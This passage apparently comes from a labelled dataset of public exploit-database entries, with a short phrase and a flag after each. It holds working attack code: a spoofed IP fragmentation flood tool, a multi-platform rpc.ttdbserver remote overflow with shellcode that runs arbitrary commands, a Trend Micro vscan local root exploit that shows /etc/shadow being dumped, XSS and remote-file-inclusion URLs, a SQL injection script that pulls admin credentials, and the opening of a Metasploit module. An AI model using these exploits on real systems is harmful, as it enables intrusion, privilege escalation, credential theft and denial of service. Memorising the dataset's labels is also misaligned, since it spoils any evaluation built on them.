netwib_udphdr udpheader, udpstore[NUM_PACKETS];   netwib_buf payload;   netwib_uint32 numsent = 0;   int i, j, nrun2;  printf(""Packets %d Rewrite %d Runs %d Fragment packet to byte %d Delta %d\n\r"",            npack, nrew, nrun, nfrag, ndelta);      for (nrun2=0; nrun2<nrun; nrun2++) {      for (i=0; i<npack; i++){ 	netwib_er(netwib_iphdr_initdefault(NETWIB_IPTYPE_IP4, &ipstore[i])); 	netwib_er(netwib_uint32_init_rand_all(&ipstore[i].src.ipvalue.ip4)); 	switch(prp->type) { 	case ROSE_TYPE_TCP :         netwib_er(netwib_tcphdr_initdefault(&tcpstore[i]));         netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &tcpstore[i].src));         if (prp->port == 0) {           netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &tcpstore[i].dst)); 	} else { 	  tcpstore[i].dst = prp->port;     	}         break; 	case ROSE_TYPE_UDP : 	netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &udpstore[i].src)); 	if (prp->port == 0) { 	  netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &udpstore[i].dst));         } else {           udpstore[i].dst = prp->port;         } 	break;        }     }          for (i=0; i<npack; i++){     /* construct first fragment */     netwib__buf_reinit(&prp->buf);     ipheader = ipstore[i];     ipheader.header.ip4.morefrag = NETWIB_TRUE;     ipheader.header.ip4.offsetfrag = 0; /* not necessary, but to be clear */     ipheader.src.iptype = NETWIB_IPTYPE_IP4;     ipheader.src.ipvalue.ip4 = ipstore[i].src.ipvalue.ip4;     ipheader.dst = prp->ipad;     switch(prp->type) {     case ROSE_TYPE_TCP :       tcpheader = tcpstore[i];       tcpheader.src = tcpstore[i].src;       tcpheader.dst = tcpstore[i].dst;       tcpheader.ack = NETWIB_TRUE;       netwib_er(netwib_buf_init_ext_text(""1234567890123456789012345678"",                                          &payload));       netwib_er(netwib_pkt_append_iptcpdata(&ipheader, &tcpheader, &payload,                                           &prp->buf));       break;     case ROSE_TYPE_UDP :       netwib_er(netwib_udphdr_initdefault(&udpheader));       udpheader.src = udpstore[i].src;       udpheader.dst = udpstore[i].dst;       netwib_er(netwib_buf_init_ext_text(""12345678901234567890123456789012"",                                          &payload));       netwib_er(netwib_pkt_append_ipudpdata(&ipheader, &udpheader, &payload,                                             &prp->buf));       break;     }     if (prp->display) {       netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY,                                       NETWIB_ENCODETYPE_DUMP));     }     netwib_er(netwib_io_write(prp->pio, &prp->buf));          /* construct middle fragments */     netwib__buf_reinit(&prp->buf);     ipheader.header.ip4.offsetfrag = 0x0008;     for(ipheader.header.ip4.offsetfrag = 0x0008 ;  	ipheader.header.ip4.offsetfrag< nfrag;  	ipheader.header.ip4.offsetfrag = ipheader.header.ip4.offsetfrag +  	                                 ndelta){     netwib__buf_reinit(&prp->buf);     switch(prp->type) {     case ROSE_TYPE_TCP :       ipheader.protocol = NETWIB_IPPROTO_TCP;       break;     case ROSE_TYPE_UDP :       ipheader.protocol = NETWIB_IPPROTO_UDP;       break;     }     netwib_er(netwib_buf_init_ext_text(""12345678901234567890123456789012"", 			    &payload));     netwib_er(netwib_pkt_append_ipdata(&ipheader, &payload, &prp->buf));     if (prp->display) {     netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY, 				    NETWIB_ENCODETYPE_DUMP));     }     netwib_er(netwib_io_write(prp->pio, &prp->buf));     }      }      printf(""Rewriting %d packets last fragment %d times\r\n"", 		    npack,nrew); fflush(stdout);      /* construct last fragment and rewrite NUM_LAST times */     for (j=0;j<nrew;j++){     netwib__buf_reinit(&prp->buf);     for (i=0; i<npack; i++){     ipheader = ipstore[i];     ipheader.src.iptype = NETWIB_IPTYPE_IP4;     ipheader.src.ipvalue.ip4 = ipstore[i].src.ipvalue.ip4;     ipheader.dst = prp->ipad;     switch(prp->type) {     case ROSE_TYPE_TCP :       tcpheader = tcpstore[i];       tcpheader.src = tcpstore[i].src;       tcpheader.dst = tcpstore[i].dst;       tcpheader.ack = NETWIB_TRUE;       ipheader.protocol = NETWIB_IPPROTO_TCP;     break;     case ROSE_TYPE_UDP :       udpheader.src = udpstore[i].src;       udpheader.dst = udpstore[i].dst;       ipheader.protocol = NETWIB_IPPROTO_UDP;     break;     }          netwib__buf_reinit(&prp->buf);     ipheader.header.ip4.morefrag = NETWIB_FALSE;     ipheader.header.ip4.offsetfrag = 0x1FF0;     netwib_er(netwib_buf_init_ext_text(""12345678901234567890123456789012"",                                        &payload));     netwib_er(netwib_pkt_append_ipdata(&ipheader, &payload, &prp->buf));     if (prp->display) {       netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY,                                       NETWIB_ENCODETYPE_DUMP));        }     netwib_er(netwib_io_write(prp->pio, &prp->buf));     }     }     /* dot display */     if (!prp->display && (numsent%100)==0) {       printf("".""); fflush(stdout);     }     numsent++;   }    return(NETWIB_ERR_OK); }  /*-------------------------------------------------------------*/ int main(int argc, char* argv[]) {   rose_params rp;   netwib_buf ipstr;   netwib_err ret;   int npack, nrew, nrun, nfrag, ndelta;    /* initialize netwib */   netwib_init();    /* check parameter count */   if (argc < 3 || argc > 9) {     printf(""Usage  : %s type(1or2) ipaddress [port] [NumP] [Numt] [NumR] [NumF] [NumD]\n"", argv[0]);     printf(""Example: %s 1 1.2.3.4 80 5 9999 99999999 1021 8\n"", argv[0]);     printf("" type      : %d=tcp, %d=udp\n"", ROSE_TYPE_TCP, ROSE_TYPE_UDP);     printf("" ipaddress : address to test\n"");     printf("" port      : optional port number (0 means random)\n"");     printf("" NumP      : Number of packets to fragment\n"");     printf("" NumT      : Number of times last fragment is rewritten\n"");     printf("" NumR      : Number of times to run test\n"");     printf("" NumF      : Number of fragments per packet\n"");     printf("" NumD      : Delta between fragements.\n"");    return(1);   }    /* first parameter is type */   rp.type = atoi(argv[1]);   switch(rp.type) {   case ROSE_TYPE_TCP :   case ROSE_TYPE_UDP :     break;   default :     printf(""First parameter must be 1 or 2 (currently=%s)\n"", argv[1]);     return(2);   }    /* second parameter is IP address */   netwib_er(netwib_buf_init_ext_text(argv[2], &ipstr));   ret = netwib_ip_init_buf(&ipstr, NETWIB_IP_DECODETYPE_BEST, &rp.ipad);   if (ret != NETWIB_ERR_OK) {     printf(""Second parameter must be an IP or hostname (currently=%s)\n"",            argv[2]);     return(3);   }    /* third parameter is port number */   rp.port = 0;   if (argc > 3) {     rp.port = atoi(argv[3]); /* on error, set to 0, but that's ok */   }    /* fourth parameter is number of packets to fragment */   npack = 5;   if (argc > 4) {     npack = atoi(argv[4]); /* on error, set to 1 */     }   if (npack < 1) { npack = 1; }   if (npack > 1000) { npack = 1000; }      /* fifth parameter is number of times packet is rewritten */   nrew = NUM_LAST;   if (argc > 5) {     nrew = atoi(argv[5]); /* on error, set to 0, but that's ok */     }      /* sixth parameter is number of times to run the test */   nrun = NUM_RUN;   if (argc > 6) {     nrun = atoi(argv[6]); /* on error, set to 0, but that's ok */     }      /* seventh parameter is number of fragments per packet */   nfrag = NUM_FRAG;   if (argc > 7) {     nfrag = atoi(argv[7]);      }   if (nfrag < 1) { nfrag = 1; }    /* eighth parameter is delta between fragments */     ndelta = NUM_DELTA;     if (argc > 8) {       ndelta = atoi(argv[8]);       }    /* Make sure that the fragments do not exceed 8170 */      nfrag = (nfrag * ndelta) + 8;     if (nfrag > 8170) { nfrag = 8170; }      printf(""%s %d %s %d %d %d %d %d ndelta = %d\n\r"",           argv[0], rp.type, argv[2], rp.port, npack, nrew, nrun,  	  nfrag / 8, ndelta);    /* set to NETWIB_TRUE to activate display */   rp.display = NETWIB_FALSE;    /* instead of allocating memory each time, just use this permanent buffer */   netwib_er(netwib_buf_init_mallocdefault(&rp.buf));    /* initialize spoofing feature */   netwib_er(netwib_io_init_spoof_ip(NETWIB_SPOOF_IP_INITTYPE_LINKBRAW,                                     &rp.pio));    /* main function */   ret = rose_loop(&rp, npack, nrew, nrun, nfrag, ndelta);   if (ret != NETWIB_ERR_OK) {     netwib_er(netwib_err_display(ret, NETWIB_ERR_ENCODETYPE_FULL));     return(ret);   }    /* close netwib */   netwib_er(netwib_io_close(&rp.pio));   netwib_er(netwib_buf_close(&rp.buf));   netwib_close();    return(0); }",fragmented TCP packets,1
19635,"Sun Solaris 7.0 - rpc.ttdbserver Denial of Service // source: https://www.securityfocus.com/bid/811/info  It is possible to crash rpc.ttdbserver by using the old tddbserver buffer overflow exploit. This problem is caused by a NULL pointer being dereferenced when rpc function 15 is called with garbage. You cannot make rpc.ttdbserver execute arbitrary code with this vulnerability. The consequence of this vulnerability being exploited is a denial of service condition (rpc.ttdbserver).  /*  rpc.ttdbserver remote overflow, apk  Solaris (tested on SS5 and Ultra 2.5.1)  Irix (tested on r5k and r10k O2 6.3),   HP-UX ( tested on 700s 10.20)   usage: ./r [-ku] [-p port] [-f outfile] host cmd            -k : kill ttdbserver (read below)            -u : use UDP (default TCP)            -p port : connect to ttdbserver at port (don't ask portmap)            -f outfile : store rpc message in outfile (and do NOT contact host)   note:    it should compile on any normal system, to get HP-UX exploit compile with       -DHPUX, for Solaris -DSOLARIS, for Irix use -DIRIX    cmd is run through sh -c, and there is no practical limit for command       length, but it has to fit in buffer (1024 bytes in this case),       and ~(strlen + 1) cannot contain '0'    by default ttdbserver runs from inetd, so it will be respawned each time      it die (I mean execute command), also because it dies correct reply is      clnt_call error (connection reset, timeout etc)    -f file option: On HP-UX and Irix, connected socket gets first free      descriptor, 3 on HP-UX and 5 on Irix. You can use -f option to store      datagram to file, and send it to ttdbserver with your telnet of       choice.  With command like ""0<&3 1>&3 2>&3 exec sh"" on HP-UX you'll get      remote shell running. Solaris dup() connected fd to first free one      over 256, so you have to study sh man page to find a way to do this <g>      You should kill ttdbserver before, to make sure it doesn't have      any files open except 0-2 fds passed from inetd. Actually on Irix      it looks like fucked up, ttdbserver gets 0-2 fds from inetd, ignores      them and opens new ones as 3 and 4 fd, so you need to redirect 5th fd.      It happens on 6.3 at least, I need to look at other versions.      Irix is also the only one I saw which supports ttdbserver over UDP,      keep in mind that by default generated RPC datagram is TCP version with      record marking, you should use -u option to get UDP version (or just remove      first four bytes from generated file)   for reasons I can't quite understand, you _have_ to kil ttdbserver on Solaris     before sending a command there. When ttdbserver has connected clients,     it simply returns an error (filename too long). In both cases     it looks like the program goes through the same way, well, maybe I'll     get a clue one day what happens there.   On Irix to get over its fucked up cache, I simply send like 20kb to make     it flushed, so it's not reliable. You can find a buffer allocated by xdr      and it should be better.    surprizingly there are some differences between ttdbserver on above platforms,     like solaris dup() of fds, start-up Irix behaviour, the fact that     on Irix it first tries chdir to directory then do some task (it's the     reason I have to add ""/f"" at the end of buffer to have it copy overflow     part of the buffer on stack) etc. That's why it may not work on other     systems and versions than mentioned at the beginning.   */  #include <sys/types.h> #include <sys/time.h> #include <sys/socket.h> #include <netinet/in.h> #include <arpa/inet.h> #include <stdio.h> #include <unistd.h> #include <fcntl.h> #include <stdlib.h> #include <errno.h> #include <string.h> #include <netdb.h> #include <rpc/rpc.h>  #define PORT 0 #define BSIZE 1024  #if defined(SOLARIS) # define SP 0xefffd618 # define LENOFS 80 char asmcode[]=""\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x92\x03\xe0\x48\x90\x02\x60\x10\xe0\x02\x3f\xf0\xa2\x80\x3f\xff\xa0\x24\x40\x10\xd0\x22\x3f\xf0\xc0\x22\x3f\xfc\xa2\x02\x20\x09\xc0\x2c\x7f\xff\xe2\x22\x3f\xf4\xa2\x04\x60\x03\xc0\x2c\x7f\xff\xe2\x22\x3f\xf8\xa2\x04\x40\x10\xc0\x2c\x7f\xff\x82\x10\x20\x0b\x91\xd0\x20\x08\xff\xff\xff\xfc\x22\x22\x22\x22\x33\x33\x33\x33\x44\x44\x44\x44\x2f\x62\x69\x6e\x2f\x6b\x73\x68\x2e\x2d\x63\x2e""; char NOP[]=""\x80\x1c\x40\x11""; #endif  #if defined(HPUX) # define SP 0x7b03cc10 # define LENOFS 84 char asmcode[]=""\xeb\x40\x40\x02\x0b\x39\x02\x80\xd7\x40\x0c\x1e\xb7\x5a\x20\xb8\x0b\x5a\x02\x59\x0f\x21\x10\x98\x97\x18\x07\xff\x0f\x39\x12\x81\x0f\x20\x12\x99\xb7\x39\x20\x10\x0f\x20\x12\x1f\x0f\x59\x12\x89\xb7\x39\x20\x06\x0f\x20\x12\x1f\x0f\x59\x12\x91\x0b\x38\x06\x19\x0f\x20\x12\x1f\xb7\x59\x07\xe1\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x10\x16\x11\x11\x11\x11\x22\x22\x22\x22\x33\x33\x33\x33\x44\x44\x44\x44\x2f\x62\x69\x6e\x2f\x73\x68\x2e\x2d\x63\x2e""; char NOP[]=""\x0b\x39\x02\x80""; #endif  #if defined(IRIX) # define SP 0x7fff1b30 # define LENOFS 76 char asmcode[]=""\x04\x10\xff\xff\x27\xe4\x01\x01\x24\x84\xff\x5e\x8c\x8c\xff\xe5\x24\x0d\xff\xff\x01\xac\x60\x23\x01\x84\x60\x20\xa1\x80\xff\xff\xa0\x80\xff\xff\xac\x84\xff\xed\x24\x84\xff\xfd\xa0\x80\xff\xff\xac\x84\xff\xec\x24\x84\xff\xf8\x24\x85\xff\xf0\xac\x84\xff\xf0\xac\x80\xff\xfc\x24\x02\x03\xf3\x02\x04\x8d\x0c\xff\xff\xff\xfc\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x2f\x62\x69\x6e\x2f\x73\x68\x2e\x2d\x63\x2e""; char NOP[]=""\x24\x0f\x12\x34"";  #endif  #define TT_DBSERVER_PROG 100083 #define TT_DBSERVER_VERS 1 #define _TT_P 7  struct tt_reply {   int i1;   int i2; };  void usage(char *s) {   printf(""Usage: %s [-ku] [-p port] [-f outfile] host cmd\n"", s);   exit(0); }  bool_t xdr_tt_reply(XDR *xdrs, struct tt_reply *objp) {    if (!xdr_int(xdrs, &objp->i1))     return (FALSE);   if (!xdr_int(xdrs, &objp->i2))      return (FALSE);   return (TRUE); }  void make_file(char *fname, char *buf, int type);  main(int argc, char *argv[]) {   extern int optind;   extern char *optarg;   CLIENT *cl;   enum clnt_stat stat;   struct timeval tm;   struct hostent *hp;   struct sockaddr_in target;   struct tt_reply op_res;   char buf[64000], *path, *cmd, *host, *bp, *outfile = NULL;   int sd, i, sp = SP, bsize = BSIZE, port = PORT, kill = 0, proto = 0;    while ((i = getopt(argc, argv, ""ukp:f:"")) != EOF)     switch (i) {       case 'p':         port = atoi(optarg);         break;       case 'k':         kill = 1;         break;       case 'u':         proto = 1;         break;       case 'f':         outfile = optarg;         break;       default:         usage(argv[0]);     }   if (argc - optind < 2)     usage(argv[0]);   cmd = argv[optind + 1];   host = argv[optind];    for (i = 0; i < sizeof(buf); i++)     *(buf + i) = NOP[i % 4];    i = bsize - strlen(asmcode) - strlen(cmd);   i &= 0xfffffffc;   strcpy(buf + i, asmcode);   strcat(buf, cmd);   *(int *)(buf + i + LENOFS) = ~(strlen(cmd) + 1);   buf[strlen(buf)] = '.';   bp = buf + bsize;   for (i = 0; i < 16; bp+=4, i++)     *(int *)bp = sp; #ifdef IRIX   sp = sp + 400 + 31652;   for (i = 0; i < 5000; bp+=4, i++)     *(int *)bp = sp;   *bp++ = '/';   *bp++ = 'f';   path = buf + 2; #else   path = buf; #endif   *bp = 0;    if (outfile) {     make_file(outfile, buf, proto);     printf(""rpc datagram stored in %s\n"", outfile);     exit(0);   }    if ((target.sin_addr.s_addr = inet_addr(host)) == -1) {     if ((hp = gethostbyname(host)) == NULL) {       printf(""%s: cannot resolve\n"", host);       exit(1);      } else       target.sin_addr.s_addr = *(u_long *)hp->h_addr;   }   target.sin_family = AF_INET;   target.sin_port = htons(port);   sd = RPC_ANYSOCK;    tm.tv_sec = 4;   tm.tv_usec = 0;   if (proto)      cl = clntudp_create(&target, TT_DBSERVER_PROG, TT_DBSERVER_VERS, tm, &sd);   else     cl = clnttcp_create(&target, TT_DBSERVER_PROG, TT_DBSERVER_VERS, &sd, 0, 0);   if (cl == NULL) {     clnt_pcreateerror(""clnt_create"");     exit(0);   }   cl->cl_auth = authunix_create(""localhost"", 0, 0, 0, NULL);   tm.tv_sec = 10;    if (kill) {     path = NULL;     bp = NULL;     if ((stat = clnt_call(cl, 15, xdr_wrapstring, (char *)&path,          xdr_wrapstring, (char *)&bp, tm)) != RPC_SUCCESS) {       clnt_perror(cl, ""clnt_call"");       exit(1);     }     printf(""Could not kill ttdbserver, reply is: %s\n"", bp);     exit(1);   }    if ((stat = clnt_call(cl, _TT_P, xdr_wrapstring, (char *)&path, xdr_tt_reply,         (char *)&op_res, tm)) != RPC_SUCCESS) {     clnt_perror(cl, ""clnt_call"");     exit(1);   }   printf(""res i1 %d, res i2 %d\n"", op_res.i1, op_res.i2);   clnt_destroy(cl); }  void make_file(char *fname, char *buf, int type) {   int fd, offs;   XDR xdrm;   struct rpc_msg rpc_hdr;   struct authunix_parms aup;   char dgram[64000], rauth[MAX_AUTH_BYTES];    if (type == 1) /* UDP */     offs = 4;   if ((fd = open(fname, O_RDWR | O_CREAT | O_TRUNC, 0666)) == -1) {     perror(fname);     exit(1);   }   xdrmem_create(&xdrm, rauth, sizeof(rauth), XDR_ENCODE);   aup.aup_time = (u_long)time(NULL);   aup.aup_machname = ""localhost"";   aup.aup_uid = 0;   aup.aup_gid = 0;   aup.aup_len = 0;   aup.aup_gids = NULL;   if (xdr_authunix_parms(&xdrm, &aup) == FALSE) {     printf(""error encoding auth cred\n"");     exit(1);   }   rpc_hdr.rm_call.cb_cred.oa_length = xdr_getpos(&xdrm);   xdr_destroy(&xdrm);   xdrmem_create(&xdrm, dgram + 4, sizeof(dgram), XDR_ENCODE);   rpc_hdr.rm_xid = 0x12345678;   rpc_hdr.rm_direction = CALL;   rpc_hdr.rm_call.cb_rpcvers = 2;   rpc_hdr.rm_call.cb_prog = TT_DBSERVER_PROG;   rpc_hdr.rm_call.cb_vers = TT_DBSERVER_VERS;   rpc_hdr.rm_call.cb_proc = _TT_P;   rpc_hdr.rm_call.cb_cred.oa_flavor = AUTH_UNIX;   rpc_hdr.rm_call.cb_cred.oa_base = rauth;   rpc_hdr.rm_call.cb_verf.oa_flavor = AUTH_NONE;   rpc_hdr.rm_call.cb_verf.oa_base = NULL;   rpc_hdr.rm_call.cb_verf.oa_length = 0;   if (xdr_callmsg(&xdrm, &rpc_hdr) == FALSE) {     printf(""error encoding rpc header\n"");     exit(1);   }   if (xdr_wrapstring(&xdrm, &buf) == FALSE) {     printf(""error encoding rpc data\n"");     exit(1);   }   /* record marking */   *(u_int *)dgram = 0x80000000 | xdr_getpos(&xdrm);   if (write(fd, dgram + offs, xdr_getpos(&xdrm) + 4) == -1) {     perror(""write"");     exit(1);   }   xdr_destroy(&xdrm);   close(fd); }",using the old tddbserver buffer overflow exploit,1
3213,"Trend Micro VirusWall 3.81 - 'vscan/VSAPI' Local Buffer Overflow /*      Title: Local root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)      Author: Sebastian Wolfgarten / sebastian@wolfgarten.com / http://www.devtarget.org      Date: January 3rd, 2007      Severity: Medium      Description:      The product ""InterScan VirusWall 3.81 for Linux"" ships a library called      ""libvsapi.so"" which is vulnerable to a memory corruption vulnerability.      One of the applications that apparently uses this library is called ""vscan""     which is set suid root by default. It was discovered that this supporting     program is prone to a classic buffer overflow vulnerability when a particularly     long command-line argument is being passed and the application utilizes the flawed     library to attempt to copy that data into a finite buffer.       As vscan is set suid root, this leads to arbitrary code execution with root level     privileges. However the severity of this vulnerability is probably ""medium"" as by default     the vscan file is only executable by the root user as well as members of the ""iscan""     group which is created during the installation of the software.      Example:      sebastian@debian31:~$ ./tmvwall381v3_exp      Local root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)     Author: Sebastian Wolfgarten, <sebastian@wolfgarten.com>     Date: January 3rd, 2007      Okay, /opt/trend/ISBASE/IScan.BASE/vscan is executable and by the way, your current user id is 5002.      Executing /opt/trend/ISBASE/IScan.BASE/vscan. Afterwards check your privilege level with id or whoami!     Virus Scanner v3.1, VSAPI v8.310-1002     Trend Micro Inc. 1996,1997         Pattern number 4.155.00      sh-2.05b# id     uid=5002(sebastian) gid=100(users) euid=0(root) groups=100(users),5001(iscan)      sh-2.05b# cat /etc/shadow      root:***REMOVED***:13372:0:99999:7:::     daemon:*:13372:0:99999:7:::     bin:*:13372:0:99999:7:::     sys:*:13372:0:99999:7:::     sync:*:13372:0:99999:7:::     games:*:13372:0:99999:7:::     man:*:13372:0:99999:7:::     lp:*:13372:0:99999:7:::     mail:*:13372:0:99999:7:::     news:*:13372:0:99999:7:::     uucp:*:13372:0:99999:7:::     proxy:*:13372:0:99999:7:::     www-data:*:13372:0:99999:7:::     backup:*:13372:0:99999:7:::     list:*:13372:0:99999:7:::     irc:*:13372:0:99999:7:::     gnats:*:13372:0:99999:7:::     nobody:*:13372:0:99999:7:::     Debian-exim:!:13372:0:99999:7:::     sshd:!:13372:0:99999:7:::     postfix:!:13500:0:99999:7:::     mysql:!:13500:0:99999:7:::     vmail:!:13500:0:99999:7:::     amavis:!:13500:0:99999:7:::     iscan:!:13500:0:99999:7:::     sebastian:***REMOVED***:13500:0:99999:7:::      Credits:      Must go to Aleph One for the shellcode and mercy for bits of the code.  */  #include <stdio.h> #include <stdlib.h> #include <string.h>  #define NOP 0x90 #define vscan ""/opt/trend/ISBASE/IScan.BASE/vscan""  // Shellcode by Aleph One char shellcode[] = ""\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b""  		   ""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd""                     ""\x80\xe8\xdc\xff\xff\xff/bin/sh"";  unsigned long get_sp(void) {      __asm__(""movl %esp, %eax"");  }  int main(int argc, char *argv[], char **envp) {      // Size of the vulnerable buffer (1116 + 4 bytes to overwrite EIP)     int buff = 1120;      // Address of the shellcode     unsigned long addr;      // Temporarily used to add nops etc.     char *ptr;      printf(""\nLocal root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)\n"");     printf(""Author: Sebastian Wolfgarten, <sebastian@wolfgarten.com>\n"");     printf(""Date: January 3rd, 2007\n\n"");      // Check permissions on vscan executable, if this fails exploitation is infeasible.     if (access(vscan, 01) != -1) {          printf(""Okay, %s is executable and by the way, your current user id is %d.\n"",vscan,getuid());  	// Allocate memory for filling the buffer         if((ptr = (char *)malloc(buff)) == NULL) {  		printf(""Error allocating memory!\n""); 		exit(-1);  	}  	// Determine the address of the shellcode with the inline assembly above         addr = get_sp();          // Add the NOP's to the buffer         memset(ptr, NOP, buff);          // Add the shellcode         memcpy(ptr + buff - strlen(shellcode) - 8, shellcode, strlen(shellcode));          // The return address         *(long *)&ptr[buff - 4] = addr;          // Off we go, execute the vulnerable program         printf(""\nExecuting %s. Afterwards check your privilege level with id or whoami!\n"",vscan);         execl(vscan, ""vscan"", ptr, NULL);      } else {          printf(""Exploit failed. You seem not to have enough privileges to execute %s, sorry.\n"",vscan); 	printf(""Hint: Ask your local admin to add yourself to the iscan group or let him make the vscan binary world-executable.\n""); 	printf(""Then try again :-)\n\n""); 	exit(1);      }      return 0;  }  // milw0rm.com [2007-01-28]",a particularly long command-line argument is being passed,1
22843,"MegaBook 1.1/2.0/2.1 - Multiple HTML Injection Vulnerabilities source: https://www.securityfocus.com/bid/8065/info  MegaBook is prone to multiple HTML injection vulnerabilities. This is due to insufficient sanitization of HTML and script code from user-supplied input, including input supplied to the administrative login page and via the client HTTP User-Agent: header field. Exploitation of these issues could permit hostile HTML or script code to be injected into the guestbook system and rendered in the browser of a legitimate guestbook user.  http://www.example.com/admin.cgi?action=modifypost&entryid=66&password=<script>alert('wvs-xss-magic-string-188784308');</script> http://www.example.com/admin.cgi?action=modifypost&entryid=66&password='><script>alert('wvs-xss-magic-string-486624156');</script> http://www.example.com/admin.cgi?action=modifypost&entryid=66&password=""><script>alert('wvs-xss-magic-string-1852691616');</script> http://www.example.com/admin.cgi?action=modifypost&entryid=66&password=><script>alert('wvs-xss-magic-string-429380114');</script> http://www.example.com/admin.cgi?action=modifypost&entryid=66&password=&lt;/textarea&gt;<script>alert('wvs-xss-magic-string-723975367');</script>",malicious HTML code,1
5620,"rgboard 3.0.12 - Remote File Inclusioni / Cross-Site Scripting ################################################ #    Rgboard 3.0.x  Multiple Vulnerabilities   # #                  (RFI/XSS)                   # ################################################  /**/    Author::  e.wiZz!   /**/   Site::  www.balcanwarez.com    /**/   Contact:: N/A :D =========================================================== /**/   Script :: Rgboard   /**/   Vulnerable version :: 3.0.0/3.0.12  /**/ Not vulnerable :: 4.0   /**/   Download :: www.rgboard.com ============================================================   [<Remote File Include>]  /**/ Vulnerable code,line 22: \include\bbs.lib.inc.php  if (!defined(â€™BBS_LIB_INC_INCLUDEDâ€™)) { define(â€™BBS_LIB_INC_INCLUDEDâ€™, 1); // *start of include,eh?*  if(!$site_path) $site_path=â€™./â€™; require_once â€œ{$site_path}include/lib.inc.phpâ€; //$site_path  /**/  Exploit:  http://www.target.com/include/bbs.lib.inc.php?site_path=evilthingg0ezhere                [<XSS>]  /**/  Almost every field is vulnerable to xss,example(rg_search.php):   /**/  Live demo:    http://xxx.com/rgboard/rg_search.php?bbs_id=search&page_no=2&s_text=%22%3E%3Ca+href%3D%22http%3A%2F%2Fbalcanwarez.com%22%3E%3Ch1%3EOvdje nesto bezze upises,boli me kita :D%3C%2Fh1%3E%3C%2Fa%3E            ============================================================== /**/  Thanx : QKrun1x,F34R,aluigi,Nuclear,aluigi,str0ke   /**/ PozdraF : deckima s elitesecurity.org i cyber-underground.org ===============================================================  # milw0rm.com [2008-05-14]",malicious PHP code,1
18526,"YVS Image Gallery - SQL Injection -=[+] Application: YVS Image Gallery -=[+] Version: 0.0.0.1 -=[+] Vendor's URL: http://yvs.vacau.com/gallery.html -=[+] Platform: Windows\Linux\Unix -=[+] Bug type: Sql INJECTIONS -=[+] Exploitation: Remote -=[-] -=[+] Author: Corrado Liotta Aka CorryL ~ corryl80[at]gmail[dot]com ~ -=[+] Facebook: https://www.facebook.com/CorryL -=[+] Twitter: https://twitter.com/#!/CorradoLiotta -=[+] Linkedin: http://it.linkedin.com/pub/corrado-liotta/21/1a8/611 -=[+] +Google: https://plus.google.com/u/0/109396477464303670923  ...::[ Descriprion ]::..  This is a small database driven gallery created to be implemented within your existing site. The coding is reasonably straight forward and can be easily moved into your existing development by anyone with basic understanding of PHP. Only a first attempt at the system has a long way to go, but it provides you with all the necessary tools to run your own picture gallery, such as uploading of multiple images and creation of thumbnails. The gallery is distributed as free-ware but if you decide to use it in any business or just decide that it's worth it, any donations will be greatly appreciated. details will be made available soon.   ...::[ Bug ]::..  exploiting this bug a remote attaker is able' to go up again to user name and admin password    ...::[ Proof Of Concept ]::..  http://Server-Victim/image_gallery/view_album.php?album_id=-1%20UNION%20%20SELECT%20username%20FROM%20user  ...::[ Exploit ]::..  #!/usr/bin/php -f <?php # # view_album.php curl exploit #   // Created by Corrado Liotta Aka CorryL // For educational only // use php exploit.php 127.0.0.1 username for admin username o password for admin password  $target = $argv[1]; $info = $argv[2];  $ch = curl_init(); curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); curl_setopt($ch, CURLOPT_URL, ""http://$target/image_gallery/view_album.php?album_id=-1%20UNION%20%20SELECT%20$info%20FROM%20user""); curl_setopt($ch, CURLOPT_HTTPGET, 1); curl_setopt($ch, CURLOPT_USERAGENT, ""Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)""); curl_setopt($ch, CURLOPT_TIMEOUT, 3); curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3); curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3); curl_setopt($ch, CURLOPT_COOKIEJAR, ""/tmp/cookie_$target""); $buf = curl_exec ($ch); curl_close($ch); unset($ch);  echo $buf; ?>  ..::[ Disclousure Timeline ]::..  [23/02/2012] - No Vendor Information  --  Corrado Liotta� � � �� A.k.a (CorryL) Email: corryl80@gmail.com Slype: corrado_liotta Facebook: http://www.facebook.com/home.php/CorryL Twitter: https://twitter.com/#!/CorradoLiotta Linkedin: http://it.linkedin.com/pub/corrado-liotta/21/1a8/611  Specialist in: Bug Hunting Security Audits Penetration Test",uploading of multiple images and creation of thumbnails,1
16591,"AOL Radio AmpX - ActiveX Control 'ConvertFile()' Remote Buffer Overflow (Metasploit) ## # $Id: aol_ampx_convertfile.rb 9179 2010-04-30 08:40:19Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::HttpServer::HTML  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'AOL Radio AmpX ActiveX Control ConvertFile() Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack-based buffer overflow in AOL IWinAmpActiveX 				class (AmpX.dll) version 2.4.0.6 installed via AOL Radio website. 				By setting an overly long value to 'ConvertFile()', an attacker can overrun 				a buffer and execute arbitrary code. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'rgod <rgod[at]autistici.org>',		# Original exploit [see References] 					'Trancer <mtrancer[at]gmail.com>'	# Metasploit implementation 				], 			'Version'        => '$Revision: 9179 $', 			'References'     => 				[ 					[ 